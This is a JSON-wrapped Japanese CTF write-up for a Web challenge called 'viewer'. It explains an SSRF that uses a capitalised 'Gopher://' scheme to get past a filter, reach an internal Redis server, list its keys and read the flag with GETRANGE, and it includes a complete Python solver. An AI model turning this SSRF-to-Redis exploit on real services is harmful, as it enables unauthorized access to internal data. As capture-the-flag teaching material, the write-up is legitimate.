{"pageProps":{"postData":{"id":"viewer","contentHtml":"# viewer\n\nページにアクセスすると登録を促されるため、ユーザ名を入力して登録する。\nすると、昨年の CTF の Writeup を閲覧できるページに遷移する。\nselect で選択した記事を見れるサイトらしい。\n\n## 難易度\n\nMedium\n\n## 解法\n\n配布されているソースコードを読むと、redis の中に FLAG が含まれていることがわかる。\ncurl で redis ということは、別プロトコルを利用した SSRF が思い浮かぶ。\nFlag が存在している場所は`app.py` 上か redis 内部であるため、いずれかの情報を抜き取りたい。\n前者は `file://` scheme、後者は `gopher://` scheme を利用することになりそうだ。\n\nしかし、前者は以下の `response_sanitizer` によってサニタイズされるため、後者を利用することにする。\n\n```python\n# app.py\n# a response is also sanitized just in case because the flag is super sensitive information.\nblacklist_in_response = ['TsukuCTF22']\n\ndef response_sanitizer(body: str) -> str:\n    if any([scheme in body for scheme in blacklist_in_response]):\n        return \"SANITIZED: a sensitive data is included!\"\n    return body\n```\n\n`gopher://` は禁止されているように見えるが、大文字を含めることで回避できる。\n\nただし、gopher で対象の value を取るために、redis の key を知る必要がある。\nkey は redis の `keys *` で全列挙できるため、全ての key を列挙して response に flag が含まれるものを選択すれば良い。\n\nまた、`TsukuCTF22`という文字列を含む場合は sanitize されるが、`GETRANGE` で一部を抜き出すことで対処できる。\nしたがって、方針は以下の通りになる。\nまず、redis に含まれる key を全列挙し、次に GETRANGE で列挙したものの一部を読み取る。\n\nsolver は以下の通り。\n\n```python\nimport requests\nfrom urllib.parse import quote\nimport re\nimport sys\n\n# CHANGE HERE with an appropriate url\nTARGET_URL = \"http://127.0.0.1:31555\"\n\n# enumerate redis keys\nform = {\n    \"url\": \"Gopher://redis:6379/+\" + quote(\"keys *\\r\\nQUIT\\r\\n\")\n}\ncookies = {\n    \"__SESSION_ID\": \"d8c7d141-b8da-416b-a220-d8d7218c8bbc\", # dummy session id\n}\nres = requests.post(TARGET_URL, data=form, cookies=cookies)\n\nsession_id_list = re.findall(\"(.+-.+-.+-.+-.+)\\r\", res.text)\n# print(session_id_list)\n\n# check redis value\nfor session_id in session_id_list:\n    form[\"url\"] = \"Gopher://redis:6379/+\" + quote(f\"GETRANGE {session_id} 60 -1\\r\\nQUIT\\r\\n\")\n    cookies[\"__SESSION_ID\"] = session_id\n    res = requests.post(TARGET_URL, data=form, cookies=cookies)\n    if \"CTF22{\" in res.text:\n        print(\"TsukuCTF22{\" + res.text[res.text.find(\"CTF22{\") + len(\"CTF22{\"):res.text.find(\"}&#34;\")] + \"}\")\n        sys.exit(0)\n\n```\n","title":"viewer","description":"Writeups for TsukuCTF21 have been published. Check them out if you'd like!","author":"task4233","genre":"Web","solver":8,"point":500}},"__N_SSG":true}